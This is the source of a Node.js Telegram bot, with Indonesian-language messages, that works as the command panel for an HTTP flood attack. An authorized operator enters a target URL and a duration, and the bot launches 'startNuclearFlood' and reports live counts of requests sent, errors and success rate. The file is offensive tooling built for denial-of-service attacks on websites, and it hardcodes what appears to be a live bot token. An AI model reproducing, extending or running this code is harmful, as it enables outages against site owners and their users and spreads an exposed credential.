const TelegramBot = require('node-telegram-bot-api');
const { startNuclearFlood } = require('./main.js');

const TOKEN = "8962044822:AAGNjh-qyQQsFY6SitarRFMzr5DepQOCNmY"; 

const AUTHORIZED_USER_ID = 8710323660; 

const bot = new TelegramBot(TOKEN, { polling: true });

let userState = {};

console.log("Bot berhasil dijalankan...");

const isUserAuthorized = (chatId) => {
    if (chatId !== AUTHORIZED_USER_ID) {
        bot.sendMessage(chatId, "Maaf, Anda tidak diizinkan menggunakan bot ini.");
        return false;
    }
    return true;
};

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    if (!isUserAuthorized(chatId)) return;

    const welcomeMessage = `
*Selamat Datang di Bot Kontrol!*

Bot ini siap menerima perintah Anda.
Silakan pilih opsi di bawah ini.
    `;

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🚀 Attack', callback_data: 'initiate_attack' }
                ]
            ]
        }
    };

    bot.sendMessage(chatId, welcomeMessage, options);
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;

    if (!isUserAuthorized(chatId)) {
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'initiate_attack') {
        userState[chatId] = 'awaiting_attack_details';
        
        const promptMessage = `
Silakan masukkan target dan durasi serangan.

*Format:* \`https://example.com 200\`
(URL diikuti spasi, lalu durasi dalam detik)
        `;
        
        bot.sendMessage(chatId, promptMessage, { parse_mode: 'Markdown' });
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text.startsWith('/')) return;

    if (!isUserAuthorized(chatId)) return;

    if (userState[chatId] === 'awaiting_attack_details') {
        const parts = text.split(' ');

        if (parts.length !== 2 || !parts[0].startsWith('http') || isNaN(parseInt(parts[1]))) {
            bot.sendMessage(chatId, "❌ *Format salah!*\nMohon masukkan dengan benar, contoh: `https://example.com 300`", { parse_mode: 'Markdown' });
            return;
        }

        const url = parts[0];
        const duration = parseInt(parts[1]);

        delete userState[chatId];

        const sentMessage = await bot.sendMessage(chatId, "✅ *Perintah Diterima*\n\nMenyiapkan serangan...", { parse_mode: 'Markdown' });
        const messageId = sentMessage.message_id;

        let lastMessageText = '';
        const statusCallback = (stats) => {
            const statusText = `
✅ *Serangan Sedang Berjalan*

*Target:* \`${url}\`
*Durasi Sisa:* \`${stats.secondsRemaining} detik\`
-----------------------------------
*Requests Terkirim:* \`${stats.totalSent.toLocaleString()}\`
*Requests Error:* \`${stats.totalError.toLocaleString()}\`
*Success Rate:* \`${stats.successRate} %\`
            `;

            if (statusText !== lastMessageText) {
                bot.editMessageText(statusText, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }).catch(() => {}); // Ignore errors like "message is not modified"
                lastMessageText = statusText;
            }
        };

        startNuclearFlood(url, duration, statusCallback);
        
        setTimeout(() => {
            const finalText = `
🛑 *Serangan Selesai*

*Target:* \`${url}\`
*Durasi Total:* \`${duration} detik\`
            `;
            bot.editMessageText(finalText, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown'
            }).catch(() => {});
        }, (duration + 1) * 1000);
    }
});
